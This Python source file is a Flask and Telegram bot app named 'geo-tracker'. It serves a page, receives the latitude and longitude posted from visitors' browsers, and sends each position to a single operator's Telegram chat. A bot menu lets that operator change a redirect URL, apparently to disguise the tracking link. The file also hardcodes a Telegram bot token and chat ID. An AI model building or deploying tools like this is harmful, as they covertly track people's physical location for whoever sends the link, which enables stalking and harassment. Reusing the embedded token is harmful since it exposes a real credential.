from flask import Flask, request, send_from_directory
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import threading
import os

app = Flask(__name__, static_folder='static')

BOT_TOKEN = '7673156387:AAF6Eop_JRvOY1dncc5ObC_CdBsAsQF2VJU'
CHAT_ID = 651911888  # Только ты можешь пользоваться ботом

bot = telebot.TeleBot(BOT_TOKEN)

# URL для webhook с твоим адресом Render
WEBHOOK_URL = f"https://geo-tracker-l5ui.onrender.com/{BOT_TOKEN}"

# Переменная для редиректа, можно менять через бота
redirect_url = "https://example.com"  # Начальный URL редиректа

# --- Функция для отправки координат в Telegram ---
def send_to_telegram(lat, lon):
    text = f"📍 Новая геолокация:\nШирота: {lat}\nДолгота: {lon}"
    bot.send_message(CHAT_ID, text)

# --- Flask роуты ---
@app.route('/')
def serve_index():
    return send_from_directory(app.static_folder, 'index.html')

@app.route("/send_location", methods=["POST"])
def send_location():
    data = request.json
    lat = data.get("latitude")
    lon = data.get("longitude")
    if lat and lon:
        send_to_telegram(lat, lon)
        return {"status": "ok"}
    return {"status": "error"}, 400

# --- Telegram бот команды и кнопки ---

def check_user(message):
    return message.from_user.id == CHAT_ID

@bot.message_handler(commands=['start'])
def send_welcome(message):
    if not check_user(message):
        bot.reply_to(message, "🚫 Доступ запрещен.")
        return
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("Изменить редирект", callback_data="change_redirect"))
    markup.add(InlineKeyboardButton("Скинуть ссылку на Render", callback_data="send_link"))
    bot.send_message(CHAT_ID, "Привет! Выбирай действие:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_inline(call):
    global redirect_url

    if call.from_user.id != CHAT_ID:
        bot.answer_callback_query(call.id, "🚫 Доступ запрещен.")
        return

    if call.data == "change_redirect":
        msg = bot.send_message(CHAT_ID, "Введи новый URL для редиректа:")
        bot.register_next_step_handler(msg, process_redirect_url)

    elif call.data == "send_link":
        bot.send_message(CHAT_ID, f"Вот твоя ссылка на Render:\n{redirect_url}")

def process_redirect_url(message):
    global redirect_url
    if not check_user(message):
        bot.reply_to(message, "🚫 Доступ запрещен.")
        return
    url = message.text.strip()
    redirect_url = url
    bot.send_message(CHAT_ID, f"Редирект обновлен на:\n{redirect_url}")

# --- Webhook handler ---
@app.route(f"/{BOT_TOKEN}", methods=["POST"])
def webhook():
    json_str = request.get_data().decode("utf-8")
    update = telebot.types.Update.de_json(json_str)
    bot.process_new_updates([update])
    return "", 200

if __name__ == "__main__":
    # Снимаем старый webhook (если есть)
    bot.remove_webhook()
    # Устанавливаем webhook на твой URL
    bot.set_webhook(url=WEBHOOK_URL)

    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
